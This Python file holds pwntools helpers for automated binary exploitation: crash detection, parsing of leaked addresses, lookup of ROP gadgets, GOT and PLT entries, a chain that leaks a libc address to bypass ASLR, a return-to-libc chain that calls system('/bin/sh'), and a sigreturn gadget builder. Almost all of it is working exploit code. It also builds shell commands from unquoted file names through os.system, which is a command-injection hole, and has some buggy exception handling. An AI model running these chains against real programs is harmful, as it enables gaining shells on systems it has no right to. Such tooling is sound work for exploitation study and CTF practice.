from pwn import *
import time
import subprocess
import sys
import re
import parser


def check_received_signal(received_line):
    """Checks whether the line received contains a segmentation fault, is an empty line, or something else.

    Arguments:
        dreceived_line: Data read from the process in bytes.

    Returns:
        The number corresponding to which case we are.
    """

    decoded_output = received_line.decode("utf-8")     
    if "SIGSEGV" in decoded_output: return 1
        
        
    elif received_line == b'': return 2
   
    return 0



def check_result(i, outcome):
    """Checks whether the line received in output i contains a segmentation fault.

    Arguments:
        Counter for the corrent function read from ouput question and the output from the previous function call.

    Returns:
        The function's counter if there is a segmentation otherwise a negative number.
    """

    if outcome == 1:
        return i 
       
    elif outcome == 2:
        return -1
    else:
        return -2



def line_counter(lines, delimiter):
    """Counts how many different lines there are in the output read from process.

    Arguments:
        Lines: the output read from the process.
        Delimiter: the character used to stop reading from the process.

    Returns:
        The number of lines read.
    """

    input_str = lines.decode('utf-8')  
      
    if delimiter not in input_str:
        count = 0
    else:
        count = input_str.count(delimiter)
       
    return count


def string_to_bytes(string):

    """Converts a string to byte sequence.

    Arguments:
        string: the string to be converted.

    Returns:
        The string converted into byte.
    """
    
    #Creates a string containing hexadecimal number
    pattern = re.compile(r'\\x([0-9A-Fa-f]{2})')
    matches = pattern.findall(string)
    combined_matches = ''.join(matches)

    #Converts the hexadecimal string to bytes 
    byte_sequence = bytes.fromhex(combined_matches.replace(r'\x', ''))
    
    return byte_sequence



def getLeak(message):
    """Extracts the function leak in hexadecimal from the output read.

    Arguments:
        string: the string to be converted.

    Returns:
        The string converted into byte.
    """

    pattern =  re.compile(rb'(?:[^\n]+)?[\x00-\xff]+\x7f') 
    matches = pattern.findall(message)
    string=b''
    for i, match in enumerate(matches, 1):
        string+=match
    string = string.replace(b'\n', b'')
    string = string.replace(b'Hello', b'')
    return string



def vprint(text, verbose=False):
    """Prints text if verbose mode is enabled.

    Arguments:
        text: the string of text to be printed.

        verbose: a boolean value set to False by default.
    """

    if verbose:
        print(text)

def getROP(binary):
    """Return the ROP object of the given binary.

    Arguments:
        binary: the binary executable to be converted.

    Returns:
        the ROP object of the given binary.    
    """
    return ROP(binary)

def find_rop_gadget(rop, gadget):
    """Return the ROP gadget in the ROP object of the given executable.

    Arguments:
        rop: the ROP object.
        gadget: the string of the gadget we want to search for

    Returns:
        rop_gadget: the ROP gadget in the ROP file in bytes.   
    """
    try:
        
        rop_gadget=p64(rop.find_gadget(gadget)[0])
    except AttributeError and TypeError:
        print("Gadget"+ f"{gadget}" + " not found")
        exit()
    return rop_gadget


def check_got_funct(function, binary):
    """Checks whether the function passed as a parameter is in the GOT table of the binary.

    Arguments:
        function: the function to search for in the GOT table.
        gadget: the string of the gadget we want to search for

    Returns:
        Boolean value equal to True if the function is found, false otherwise.   
    """
    try:
        binary.got[function]
        return True
    except KeyError:
        return False


def check_plt_funct(function, binary):
    """Checks whether the function passed as a parameter is in the PLT table of the binary.

    Arguments:
        function: the function to search for in the PLT table.
        gadget: the string of the gadget we want to search for

    Returns:
        Boolean value equal to True if the function is found, false otherwise.   
    """
    try:
        binary.plt[function]
        return True
    except KeyError:
        return False


def get_got_funct(function, binary):
    """Return the function's address in bytes of the GOT table's entry, if present.

    Arguments:
        function: the function to search in the GOT table.
        binary: the binary executable

    Returns:
        the function in the GOT table, if present. Otherwise, it prints an informative message and exit.   
    """
    if(check_got_funct(function, binary)):
        return p64(binary.got[function])
    else:
        print("Function not present in the GOT table")
        exit()


def get_plt_funct(function, binary):
    """Return the function's address in bytes of the PLT table's entry, if present.

    Arguments:
        function: the function to search for in the PLT table.
        gadget: the string of the gadget we want to search for

    Returns:
        Boolean value equal to True if the function is found, false otherwise.   
    """
    if(check_got_funct(function, binary)):
        return p64(binary.plt[function])
    else:
        print("Function not present in the .plt table")
        exit()


def get_symbol(elf, symbol):
    """Return the symbols's address in the elf executable.

    Arguments:
        elf: the elf executable.
        symbol: the string of the symbol we want to search for

    Returns:
        The symbol in the executable, if present. Otherwise, return None.   
    """
    try:
        return elf.symbols[symbol]
    except:
 
        return None


def build_first_rop_chain(padding, binary):
    """Return the rop chain to leak the libc's address. It is named 'first rop chain' because it is usually the first step in a ROP attack to bypass ASLR.

    Arguments:
        padding: the offset to the return address.
        binary: the binary file.

    Returns:
        The ROP chain using 'printf' as a function in the GOT table, and 'puts' in the PLT table.   
    """
    rop=ROP(binary)
    pop_rdi = find_rop_gadget(rop, ['pop rdi', 'ret'])
    printf_got = get_got_funct("printf", binary)
    puts_plt = get_plt_funct("puts", binary)
    main = p64(get_symbol(binary, "main"))
    rop_chain=b'A'*padding+pop_rdi+printf_got+puts_plt+main
 
    return rop_chain


def build_second_rop_chain(padding, binary, libc):
    """Return the rop chain to perform a return-to-libc attack.

    Arguments:
        padding: the offset to the return address.
        binary: the binary file.
        libc: the shared library file

    Returns:
        The ROP chain using 'printf' as a function in the GOT table, and 'puts' in the PLT table.   
    """
    rop=ROP(binary)
    rop_chain_2= b'A'*padding
    rop_chain_2 += find_rop_gadget(rop, ['pop rdi', 'ret'])
    rop_chain_2 += p64(next(libc.search(b'/bin/sh'))) 
    rop_chain_2 += find_rop_gadget(rop, ['ret']) 
    rop_chain_2 += p64(get_symbol(libc, "system")) 
    return rop_chain_2


def get_base_address(elf, leak, symbol):
    """Return the rop chain to leak the libc's address. It is named 'first rop chain' because it is usually the first step in a ROP attack to bypass ASLR.

    Arguments:
        padding: the offset to the return address.
        binary: the binary file.

    Returns:
        The ROP chain using 'printf' as a function in the GOT table, and 'puts' in the PLT table.   
    """
    address = u64(leak)
    if address == 0: 
        exit()
    

    base =address - elf.symbols[symbol]

    return base


def address_to_bytes(address):
    """Convert an address from string to bytes.

    Arguments:
        address: the address as a string.
        
    Returns:
        The address in bytes.   
    """
    int_address = int(address, 16)
    
    bytes_address = int_address.to_bytes(8, byteorder='little')
    return bytes_address


def delete_file(file_name):
    """Deletes a file.

    Arguments:
        file_name: the name of the file to delete.
       
    """
    
    os.system('rm ' + file_name)




def getSigReturn(binary_name):
    """Returns the address of the sigreturn frame.

    Arguments:
        binary_name: the name of the binary file.

    Returns:
        The address of the sigreturn frame.   
    """
    rop=ROP(binary_name)
    os.system(''' ROPgadget --binary '''+binary_name+ '''| grep ": mov eax, 0xf ; syscall" > sigreturn.txt''' )
    pop_rax = find_rop_gadget(rop, ['pop rax'])
    syscall = find_rop_gadget(rop, ['syscall'])
    if os.path.getsize('sigreturn.txt') == 0:
        payload = pop_rax
        payload += p64(0xf)
        payload += syscall
        delete_file('sigreturn.txt')
        return payload
    with open('sigreturn.txt', 'r') as file:
        first_line = file.readline().strip()
        address = first_line.split()[0]
        first_address = address_to_bytes(address)
    delete_file('sigreturn.txt')
    return first_address
